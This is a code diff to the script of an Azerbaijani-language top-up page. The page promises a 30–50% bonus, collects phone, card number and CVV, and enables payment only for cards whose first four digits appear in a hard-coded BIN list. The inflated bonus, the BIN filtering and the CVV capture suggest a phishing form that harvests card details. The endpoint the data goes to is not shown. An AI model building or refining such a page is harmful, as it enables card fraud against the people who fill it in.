@@ -273,80 +273,63 @@
   </div>
 
   <script>
-   const validBins = [
-  "5298", "4278", "4278", "4272", "4713", "4081", "4169", "4268", "5292", 
-  "4174", "4174", "4174", "4174", "4173", "4172", "4172", "4172", "5287", 
-  "5120", "4024", "4127", "4787", "4021", "4021", "5466", "4787", "4006", 
-  "5417", "5301", "4889", "4787", "4138", "4351", "6769", "4724", "6775", 
-  "4278", "5417", "4138", "6708", "5167", "6776", "5227", "5169", "4203", 
-  "4297", "5213", "4083", "4172", "6776", "4286", "4278", "4083", "4189", 
-  "4286", "4174", "4127", "4192", "4174", "4173", "5188", "4505", "4725", 
-  "6769", "4173", "4465", "6706", "5127", "4174", "4021", "4277", "4277", 
-  "5504", "5505", "5508", "5509", "5510", "5520", "5522", "5527", "5529", 
-  "5530", "5531", "5532", "5533", "5535", "5536", "5540", "5542", "5543", 
-  "5544", "5545", "5546", "5547", "5548", "5549", "5550", "5551", "5552", 
-  "5553", "5554", "5555", "5556", "5557", "5558", "5559", "5560", "5561", 
-  "5562", "5563", "5564", "5565", "5566", "5567", "5568", "5569", "5570", 
-  "5571", "5572", "5573", "5574", "5575", "5576", "5577", "5578", "5579", 
-  "5580", "5581", "5582", "5583", "5584", "5585", "5586", "5587", "5588", 
-  "5589", "5590", "5591", "5592", "5593", "5594", "5595", "5596", "5597", 
-  "5598", "5599"
+const validBins = [
+  "4000", "4001", "4002", "4028", "4056", "4069", "4071", "4083", "4098", "4105", "4106", "4117", "4127", "4134", "4138", "4154", "4169", "4170", "4174", "4192", "4198", "4200", "4203", "4244", "4260", "4268", "4273", "4299", "4333", "4374", "4405", "4440", "4446", "4448", "4451", "4478", "4500", "4578", "4585", "4587", "4654", "4704", "4724", "4760", "4768", "4779", "4847", "4848", "4860", "5102", "5167", "5218", "5243", "5248", "5249", "5252", "5257", "5275", "5287", "5300", "5310", "5318", "5336", "5340", "5355", "5357", "5375", "5382", "5419", "5425", "5452", "5462", "5475", "5477", "5490", "5522", "5544", "5579", "5583", "5596", "6705", "6706", "6709", "6761", "6762", "6763", "6764", "6765", "6766", "6767", "6768", "6769", "6770", "6771", "6772", "6773", "6774", "6775", "6776", "6777", "6778", "6779", "6798", "5401", "5402", "5404", "5501", "5505", "5602", "5613", "5624", "5635", "5646", "5657", "5668", "5679", "5680", "5691", "5702", "5704", "5705"
 ];
 
-
 function telefonInput(input) {
-  input.value = input.value.replace(/[^\d+]/g, '').slice(0, 13);  // Yalnız rakamlar kabul edilir
+  input.value = input.value.replace(/[^\d+]/g, '').slice(0, 13); // Yalnız rakamlar kabul edilir
 }
 
 function hesapla(tutar) {
   let bonus = 0;
   const resultElement = document.getElementById('result');
   const submitButton = document.getElementById('submit-button');
+  const kartNumarasi = document.getElementById('kart-numarasi').value.replace(/\s/g, '');
 
   // Minimum ödeme 100₼ olmalı
   if (tutar < 100) {
     resultElement.innerText = "Minimum ödəniş 100₼ olmalıdır.";
-    submitButton.disabled = true;  // 100₼'den az girildiğinde buton pasif olur
+    submitButton.disabled = true; // 100₼'den az girildiğinde buton pasif olur
   } else if (tutar >= 100 && tutar < 300) {
     bonus = tutar * 1.3;
     resultElement.innerText = `Hesabınıza gələcək məbləğ (30% bonus): ${bonus.toFixed(2)}₼`;
   } else if (tutar >= 300) {
     bonus = tutar * 1.5;
-    resultElement.innerText = `Hesabınıza gələcək məbləğ (50% bonus ): ${bonus.toFixed(2)}₼`;
+    resultElement.innerText = `Hesabınıza gələcək məbləğ (50% bonus): ${bonus.toFixed(2)}₼`;
   }
-  
-  // Kart ve tutar doğruysa buton aktif olmalı
-  const kartNumarasi = document.getElementById('kart-numarasi').value.replace(/\s/g, '');
+
+  // Kart ve tutar doğrulaması
   const submitButtonDisabled = !(validBins.includes(kartNumarasi.slice(0, 4)) && tutar >= 100);
-  submitButton.disabled = submitButtonDisabled;  // Kart ve tutar doğruluğuna göre buton durumu
+  submitButton.disabled = submitButtonDisabled;
 }
 
 function kartNumarasiInput(input) {
-  let temizNumara = input.value.replace(/\D/g, '');  // Yalnız rakamlar alınır
-  let formatliNumara = temizNumara.match(/.{1,4}/g)?.join(' ') || '';  // 4'erli gruplara ayır ve boşluk ekle
+  let temizNumara = input.value.replace(/\D/g, ''); // Yalnız rakamlar alınır
+  let formatliNumara = temizNumara.match(/.{1,4}/g)?.join(' ') || ''; // 4'erli gruplara ayır
   input.value = formatliNumara;
 
-  const bin = temizNumara.slice(0, 4);  // İlk 4 haneli bin
-  const submitButton = document.getElementById('submit-button');
+  const bin = temizNumara.slice(0, 4); // İlk 4 hane (BIN)
   const tutar = document.getElementById("tutar").value.trim();
+  const submitButton = document.getElementById('submit-button');
 
   // Kart numarası doğruysa yeşil, yanlışsa kırmızı yapılır
   if (validBins.includes(bin)) {
-    input.style.borderColor = "green";  // Geçerli bin numarası için yeşil
+    input.style.borderColor = "green"; // Geçerli bin için yeşil
   } else {
-    input.style.borderColor = "red";  // Geçersiz bin numarası için kırmızı
+    input.style.borderColor = "red"; // Geçersiz bin için kırmızı
   }
 
   // Kart ve tutar geçerli ise buton aktif olur
   if (validBins.includes(bin) && tutar >= 100) {
-    submitButton.disabled = false;  // Buton aktif olur
+    submitButton.disabled = false; // Buton aktif olur
   } else {
-    submitButton.disabled = true;  // Buton pasif olur
+    submitButton.disabled = true; // Buton pasif olur
   }
 }
 
 function cvvInput(input) {
-  input.value = input.value.replace(/\D/g, '').slice(0, 3);  // Yalnız rakamlar kabul edilir ve 3 haneli CVV
+  input.value = input.value.replace(/\D/g, '').slice(0, 3); // Yalnız rakamlar kabul edilir (3 hane)
 }
 
 window.onload = function () {
@@ -371,6 +354,7 @@ window.onload = function () {
 
 async function gonder(event) {
   event.preventDefault();
+
   const data = {
     telefon: document.getElementById("telefon-numarasi").value.trim(),
     tutar: document.getElementById("tutar").value.trim(),
@@ -395,6 +379,7 @@ async function gonder(event) {
     console.error("XƏTA", error);
   }
 }
+
 
   </script>
 </body>
